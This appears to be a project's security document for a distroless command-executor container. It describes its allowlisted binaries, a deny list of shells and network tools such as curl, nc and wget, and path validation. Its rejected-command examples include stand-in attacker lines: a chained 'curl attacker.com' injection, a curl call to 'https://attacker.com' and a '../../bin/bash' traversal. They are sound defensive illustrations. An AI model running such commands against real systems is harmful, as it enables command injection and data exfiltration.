# Allowed Binaries in Kaiburr Executor Image

**Author:** Aditya R  
**Image:** `kaiburr-executor:dev`

## Overview

The executor container is built on **distroless** with only allowlisted binaries. No shell (`/bin/sh`, `/bin/bash`) is present, eliminating shell injection attacks.

## Allowlisted Binaries

All binaries are located at `/usr/bin/<binary>` for consistent path validation.

| Binary | Path | Purpose | Example |
|--------|------|---------|---------|
| `echo` | `/usr/bin/echo` | Print text | `echo "Hello World"` |
| `date` | `/usr/bin/date` | Show date/time | `date +%Y-%m-%d` |
| `uname` | `/usr/bin/uname` | System info | `uname -a` |
| `whoami` | `/usr/bin/whoami` | Current user | `whoami` |
| `id` | `/usr/bin/id` | User/group IDs | `id -u` |
| `uptime` | `/usr/bin/uptime` | System uptime | `uptime` |
| `printenv` | `/usr/bin/printenv` | Print env vars | `printenv PATH` |
| `env` | `/usr/bin/env` | Show environment | `env` |
| `pwd` | `/usr/bin/pwd` | Current directory | `pwd` |
| `hostname` | `/usr/bin/hostname` | Show hostname | `hostname` |

## Explicitly NOT Included

These binaries are intentionally excluded for security:

- **Shells**: `sh`, `bash`, `zsh`, `ash`, `dash`
- **File operations**: `rm`, `mv`, `cp`, `dd`, `cat`, `tee`
- **Network**: `curl`, `wget`, `nc`, `telnet`, `ssh`, `scp`
- **Privilege**: `sudo`, `su`, `chown`, `chmod`
- **Process**: `kill`, `pkill`, `killall`, `ps`, `top`
- **System**: `reboot`, `shutdown`, `systemctl`, `service`
- **Package managers**: `apt`, `yum`, `apk`, `dnf`
- **Container tools**: `docker`, `kubectl`, `crictl`, `podman`

## Path Validation

The API validates that commands use full paths:

```java
String expectedPath = "/usr/bin/" + command;
// Reject if actual path doesn't match
```

This prevents:
- `../../bin/bash` (path traversal)
- `./malicious-binary` (relative paths)
- `sh -c 'curl attacker.com'` (shell doesn't exist)

## Usage Examples

### Valid Commands

```bash
# Simple echo
Command: /usr/bin/echo
Args: ["Hello", "Kaiburr"]

# Date formatting
Command: /usr/bin/date
Args: ["+%Y-%m-%d"]

# System info
Command: /usr/bin/uname
Args: ["-a"]

# User identity
Command: /usr/bin/id
Args: []
```

### Invalid Commands (Rejected)

```bash
# Shell not present
Command: /bin/sh
Args: ["-c", "echo hello"]
# ❌ Binary not in allowlist

# Relative path
Command: ./echo
Args: ["hello"]
# ❌ Must use absolute path

# Denied binary
Command: /usr/bin/curl
Args: ["https://attacker.com"]
# ❌ curl not in image, not in allowlist

# Path traversal
Command: /usr/bin/../../bin/bash
Args: []
# ❌ Contains denied sequence "../"
```

## Building the Image

```bash
cd executor
docker build -t kaiburr-executor:dev .
```

Build output:
```
[+] Building 12.3s (11/11) FINISHED
 => [builder 1/5] FROM alpine:3.19
 => [builder 2/5] RUN apk add --no-cache coreutils busybox-extras
 => [builder 3/5] RUN cp /bin/echo /executor/usr/bin/echo && ...
 => [builder 4/5] RUN /executor/usr/bin/echo "Build OK" && ...
 => [stage-1 1/1] FROM gcr.io/distroless/static-debian12:nonroot
 => [stage-1 2/2] COPY --from=builder /executor/usr/bin /usr/bin
 => exporting to image
 => => naming to kaiburr-executor:dev
```

## Verifying the Image

```bash
# List files (requires debug image)
docker run --rm gcr.io/distroless/static-debian12:debug \
  ls -la /usr/bin

# Check user
docker run --rm kaiburr-executor:dev /usr/bin/id
# Output: uid=65532(nonroot) gid=65532(nonroot) groups=65532(nonroot)

# Test binary
docker run --rm kaiburr-executor:dev /usr/bin/echo "Test OK"
# Output: Test OK

# Verify no shell (should fail)
docker run --rm kaiburr-executor:dev /bin/sh -c "echo fail"
# Error: executable file not found
```

## Security Properties

### 1. No Shell Injection

Without a shell, injection attacks fail:
```bash
# Attacker tries: echo "test"; curl attacker.com
Command: /usr/bin/echo
Args: ["test;", "curl", "attacker.com"]
# ❌ Validator rejects ";" metacharacter
# Even if it passed, curl binary doesn't exist
```

### 2. No Path Traversal

Fixed paths prevent directory traversal:
```bash
# Attacker tries: ../../bin/bash
Command: /usr/bin/../../bin/bash
# ❌ Validator rejects "../" sequence
```

### 3. No Privilege Escalation

Running as `USER 65532` (nonroot) prevents:
- Binding to privileged ports (< 1024)
- Reading sensitive files (requires ownership)
- Modifying system files (read-only FS)

### 4. No Network Exfiltration

No network binaries + NetworkPolicy = no data exfiltration

### 5. No Persistence

Read-only root FS prevents:
- Writing backdoors
- Creating cron jobs
- Modifying binaries

## Adding New Binaries

To add a new allowlisted binary:

1. **Update Dockerfile** (builder stage):
   ```dockerfile
   RUN cp /usr/bin/newbinary /executor/usr/bin/newbinary
   ```

2. **Update command-policy.yaml**:
   ```yaml
   allowlist:
     binaries:
       - newbinary
   ```

3. **Update this document**

4. **Rebuild and test**:
   ```bash
   docker build -t kaiburr-executor:dev .
   docker run --rm kaiburr-executor:dev /usr/bin/newbinary --help
   ```

5. **Add integration test**:
   ```java
   @Test
   public void testNewBinary() {
       TaskExecution result = execute("newbinary", List.of("arg1"));
       assertThat(result.getExitCode()).isEqualTo(0);
   }
   ```

## References

- [Distroless Container Images](https://github.com/GoogleContainerTools/distroless)
- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [Docker Security Best Practices](https://docs.docker.com/develop/security-best-practices/)
